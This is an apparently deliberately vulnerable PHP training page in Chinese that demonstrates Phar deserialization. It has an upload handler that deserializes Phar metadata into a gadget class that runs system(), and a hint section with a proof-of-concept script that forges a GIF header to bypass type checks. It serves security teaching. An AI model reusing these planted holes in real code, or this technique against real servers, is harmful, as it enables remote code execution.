<?php

class PharDeserialization {
    private $filename;
    private $metadata;
    
    public function __construct($filename, $metadata = null) {
        $this->filename = $filename;
        $this->metadata = $metadata;
    }
    
    public function __destruct() {
        if (file_exists($this->filename)) {
            $phar = new Phar($this->filename);
            $metadata = $phar->getMetadata();
            if ($metadata instanceof CommandExecutor) {
                $metadata();
            }
        }
    }
    
    public function __wakeup() {
        if ($this->metadata instanceof CommandExecutor) {
            ($this->metadata)();
        }
    }
}

class CommandExecutor {
    private $command;
    
    public function __construct($command) {
        $this->command = $command;
    }
    
    public function __invoke() {
        system($this->command);
    }
}

if (isset($_FILES['phar_file'])) {
    $uploadedFile = $_FILES['phar_file'];
    
    if ($uploadedFile['error'] === UPLOAD_ERR_OK) {
        $uploadDir = 'uploads/';
        if (!is_dir($uploadDir)) {
            mkdir($uploadDir, 0755, true);
        }
        
        $destFile = $uploadDir . basename($uploadedFile['name']);
        if (move_uploaded_file($uploadedFile['tmp_name'], $destFile)) {
            echo "文件上传成功！<br>";
            echo "文件名: " . htmlspecialchars($uploadedFile['name']) . "<br>";
            
            try {
                $finfo = new finfo(FILEINFO_MIME_TYPE);
                $mimeType = $finfo->file($destFile);
                echo "文件类型: " . htmlspecialchars($mimeType) . "<br>";
                
                if (strpos($mimeType, 'image') !== false) {
                    echo "图片文件，正在预览...<br>";
                    echo "<img src='" . $destFile . "' style='max-width: 300px;'><br>";
                    
                    echo "正在处理文件元数据...<br>";
                    $obj = new PharDeserialization($destFile);
                } else {
                    echo "非图片文件，已上传但不会预览<br>";
                }
            } catch (Exception $e) {
                echo "处理文件时出错: " . $e->getMessage() . "<br>";
            }
        } else {
            echo "文件上传失败！<br>";
        }
    }
}

$uploadedFiles = [];
if (is_dir('uploads/')) {
    $files = glob('uploads/*');
    foreach ($files as $file) {
        if (is_file($file)) {
            $uploadedFiles[] = basename($file);
        }
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Phar反序列化漏洞</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; padding: 30px; border-radius: 10px; margin-bottom: 20px; }
        .header h1 { margin-bottom: 10px; }
        .vuln-info { background: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        .risk-badge { display: inline-block; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; background: #ffbb33; color: white; }
        .test-area { background: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; margin-bottom: 5px; font-weight: bold; }
        .form-group input[type="file"] { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; }
        button { background: #f5576c; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
        button:hover { background: #e0465b; }
        .hint-section { background: #fff3cd; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        .hint-btn { background: #ffc107; color: #333; margin-right: 10px; margin-bottom: 10px; padding: 8px 16px; border-radius: 4px; cursor: pointer; }
        .hint-content { display: none; background: white; padding: 15px; margin-top: 10px; border-radius: 5px; border-left: 4px solid #ffc107; }
        .hint-content pre { background: #f4f4f4; padding: 10px; border-radius: 4px; overflow-x: auto; }
        .file-list { background: #f8f9fa; padding: 15px; border-radius: 5px; margin-top: 15px; }
        .file-list h4 { margin-bottom: 10px; }
        .file-list ul { list-style: none; padding-left: 0; }
        .file-list li { padding: 5px 0; border-bottom: 1px solid #e9ecef; }
        .nav { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
        .nav a { padding: 10px 20px; background: white; color: #666; text-decoration: none; border-radius: 5px; }
        .nav a:hover, .nav a.active { background: #f5576c; color: white; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>PHP Phar反序列化漏洞</h1>
            <p>通过Phar文件元数据实现反序列化攻击</p>
        </div>

        <div class="nav">
            <a href="/index.html">返回首页</a>
            <a href="/vuln5.php">PHP反序列化POP链</a>
            <a href="/vuln6.php" class="active">PHP Phar反序列化</a>
        </div>

        <div class="vuln-info">
            <h2>漏洞信息</h2>
            <p><strong>描述：</strong> Phar文件包含序列化的元数据，当通过文件操作函数（如file_exists、fopen等）访问Phar文件时，会自动反序列化元数据</p>
            <p><strong>危险等级：</strong> <span class="risk-badge">中高危</span></p>
            <p><strong>触发条件：</strong> 可以上传文件，且服务器会调用文件操作函数处理上传的文件</p>
        </div>

        <div class="test-area">
            <h3>文件上传测试区</h3>
            <form method="POST" enctype="multipart/form-data">
                <div class="form-group">
                    <label>上传文件（建议图片格式）：</label>
                    <input type="file" name="phar_file" accept="image/*" required>
                </div>
                <button type="submit">上传并测试</button>
            </form>
            
            <?php if (!empty($uploadedFiles)): ?>
            <div class="file-list">
                <h4>已上传的文件：</h4>
                <ul>
                    <?php foreach ($uploadedFiles as $file): ?>
                    <li><?php echo htmlspecialchars($file); ?></li>
                    <?php endforeach; ?>
                </ul>
            </div>
            <?php endif; ?>
        </div>

        <div class="hint-section">
            <h3>提示系统</h3>
            <button class="hint-btn" onclick="showHint(1)">提示1：Phar文件结构</button>
            <button class="hint-btn" onclick="showHint(2)">提示2：生成Phar</button>
            <button class="hint-btn" onclick="showHint(3)">提示3：利用技巧</button>
            
            <div id="hint1" class="hint-content">
                <h4>Phar文件结构</h4>
                <p>Phar文件包含：stub（识别标记）、manifest（元数据，序列化存储）、contents（文件内容）、signature（签名）。关键在于manifest中的metadata字段。</p>
            </div>
            
            <div id="hint2" class="hint-content">
                <h4>生成恶意Phar文件</h4>
                <pre><code>&lt;?php
@unlink('poc.phar');

class CommandExecutor {
    private $command = "touch /tmp/pwned";
}

$phar = new Phar('poc.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setMetadata(new CommandExecutor());
$phar->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
?&gt;</code></pre>
            </div>
            
            <div id="hint3" class="hint-content">
                <h4>利用技巧</h4>
                <p>1. 伪造文件头（如GIF89a）绕过文件类型检测<br>2. 上传后通过file_exists()、fopen()等函数触发<br>3. 可以使用PHPGGC工具快速生成各种POP链的Phar文件</p>
                <pre><code>php phar.php -p system -s "touch /tmp/pwned" > poc.phar</code></pre>
            </div>
        </div>
    </div>

    <script>
        function showHint(level) {
            var hint = document.getElementById('hint' + level);
            if (hint.style.display === 'block') {
                hint.style.display = 'none';
            } else {
                hint.style.display = 'block';
            }
        }
    </script>
</body>
</html>
